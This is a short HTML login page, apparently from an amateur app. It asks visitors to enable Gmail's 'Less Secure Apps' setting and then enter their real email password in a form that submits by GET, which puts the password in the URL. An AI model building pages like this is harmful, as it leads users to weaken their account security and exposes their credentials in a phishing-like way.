
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;
        background-image: url("svg/2.jpg");
 }
form {
  margin-top: 50px;
 solid #f1f1f1;}

input[type=text], input[type=password] {
    width: 60%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    box-sizing: border-box;
}

button {
    background-color: #4CAF50;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    cursor: pointer;
    width: 30%;
}
a {
    background-color: #4CAF50;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    cursor: pointer;
    width: 30%;
}

button:hover {
    opacity: 0.8;
}


.imgcontainer {
    text-align: center;
    margin: 24px 0 12px 0;
}

img.avatar {
    width: 40%;
    border-radius: 50%;
}

.container {
    padding: 16px;
}

span.psw {
    float: right;
    padding-top: 16px;
}


/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
    span.psw {
       display: block;
       float: none;
    }
    
}
</style>
</head>
<body>

<p align="center">
Before Moving Further Kindly switch the mode of your gmail

Follow the link<br><br>

<a href="https://myaccount.google.com/lesssecureapps" >Allow Less Secure Apps</a><br><br>

then come back!!
Thank You!
</p>


<form action="Move" method="get" >
  <center>
  <div class="container" style="background-color: white;width: 40%;" >
  <div class="container" align="center">
    <input type="text" placeholder="Enter Email" name="email" required><br/>
    <input type="password" placeholder="Enter your Original email's password" name="password" required><br/>

    
    
    <p>
         <button type="submit" name="btn" id="btn" value="Continue">Continue</button>
    </p>
  </div>
</div>

</form>
</body>
</html>
